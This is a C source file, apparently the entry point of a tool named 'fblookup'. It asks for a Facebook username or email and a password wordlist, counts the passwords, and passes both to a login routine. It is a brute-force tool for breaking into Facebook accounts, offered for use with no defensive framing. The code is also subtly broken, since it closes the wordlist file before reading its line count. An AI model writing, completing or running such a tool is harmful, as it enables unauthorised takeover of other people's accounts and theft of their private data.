#include "fblookup.c"



int main() {

    menu();
    /*If on windows, we need to first initialize winsock*/

    #if defined(_WIN32)
        WSADATA wsaData;
        if(WSAStartup(MAKEWORD(2, 2), &wsaData)) {

            printf("%s", red);
            printf("[Error]:");
            printf("%s", reset);
            printf("Failed to initialize\n");
            exit(1);
    }
    #endif
    SSL_library_init(); //Needed to intialize the OpenSSL library
    OpenSSL_add_all_algorithms(); //Needed to load all the alogrithms
    SSL_load_error_strings(); //Needed for retreiving error strings

    FILE *pass_file;
    char user[MAXINPUT], wlist_path[MAXINPUT];
    //char pass_file[100];

    prompt_user("|--Enter facebook username/id/email$ ", user);
    
    printf("|--Email > %s\n\n", user);
    prompt_user("|--Enter Wordlist Path$ ", wlist_path);

    printf("|--Wordlist > %s\n\n", wlist_path);
    pass_file = fopen(wlist_path, "r");
    if(pass_file == NULL) {

        printf("%s", red);
        printf("|--Invalid Wordlist Path: %s\n", wlist_path);
        printf("%s", reset);
        return 1;
    }
    fclose(pass_file);

    int count = get_file_lines(pass_file);


    printf("%s", cyan);
    printf("[Info]:"); printf("%s", reset);
    printf(" FBLOOKUP Discovered %d Password(s)\n", count);

    time_t current_time;
    time(&current_time);

    printf("%s", cyan);
    printf("[Info]:"); printf("%s", reset);
    printf(" Starting Fblookup At %s\n", ctime(&current_time));

    login(wlist_path, user);
    
    return 0;
}